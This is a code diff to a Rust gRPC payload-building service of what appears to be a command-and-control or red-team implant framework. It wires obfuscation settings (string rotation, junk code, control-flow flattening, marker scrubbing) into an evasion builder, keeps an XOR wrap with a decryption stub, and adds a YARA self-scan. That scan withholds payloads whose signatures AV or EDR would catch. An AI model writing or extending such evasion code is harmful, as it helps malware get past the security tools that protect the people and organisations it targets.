@@ -1541,13 +1541,14 @@ impl SpecterService for SpecterGrpcService {
             Some(fmt) => {
                 let result = self
                     .payload_builder
-                    .build_with_evasion(fmt, &profile, &server_pubkey, &channels, &sleep_config, kill_date, evasion_flags, req.debug_mode, req.skip_anti_analysis)
+                    .build_with_evasion(fmt, &profile, &server_pubkey, &channels, &sleep_config, kill_date, evasion_flags, req.debug_mode, req.skip_anti_analysis, &obf_settings)
                     .map_err(|e| Status::internal(format!("Build failed: {e}")))?;
 
-                // Obfuscation is applied to the PIC blob BEFORE embedding into PE stubs
-                // (inside PayloadBuilder::build_with_evasion). Do NOT apply it again here
-                // on the full PE, as that would corrupt PE headers and break key derivation.
-                // Only apply XOR encryption (whole-blob wrap) if requested.
+                // Obfuscation transforms (string rotation, hash randomization, junk
+                // code, CFF) are applied to the PIC blob inside build_with_evasion().
+                // Marker scrubbing is also done there. Only XOR encryption (which
+                // wraps the ENTIRE payload with a decryption stub) is applied here
+                // as the very last step, since it must cover the final assembled binary.
                 let payload = if obf_settings.xor_encryption && result.payload.len() >= 16 {
                     let xor_only = crate::builder::ObfuscationSettings {
                         xor_encryption: true,
@@ -1599,7 +1600,7 @@ impl SpecterService for SpecterGrpcService {
 
         // YARA scan
         let rules_dir = std::path::Path::new("rules");
-        let yara_warnings = if rules_dir.exists() {
+        let yara_warnings: Vec<YaraWarning> = if rules_dir.exists() {
             match crate::builder::scan_payload(&payload_bytes, rules_dir) {
                 Ok(matches) => matches
                     .into_iter()
@@ -1617,6 +1618,26 @@ impl SpecterService for SpecterGrpcService {
         } else {
             Vec::new()
         };
+
+        // Block delivery if any YARA rule tagged [CRITICAL] matched.
+        // These indicate the payload contains signatures that would be
+        // immediately detected by AV/EDR and must not be delivered.
+        let critical_matches: Vec<&str> = yara_warnings
+            .iter()
+            .filter(|w| w.tags.iter().any(|t| t == "CRITICAL"))
+            .map(|w| w.rule_name.as_str())
+            .collect();
+        if !critical_matches.is_empty() {
+            tracing::error!(
+                build_id = %build_id,
+                rules = ?critical_matches,
+                "Payload blocked by critical YARA matches"
+            );
+            return Err(Status::failed_precondition(format!(
+                "Payload blocked by YARA: {}",
+                critical_matches.join(", ")
+            )));
+        }
 
         // Audit
         let _ = self
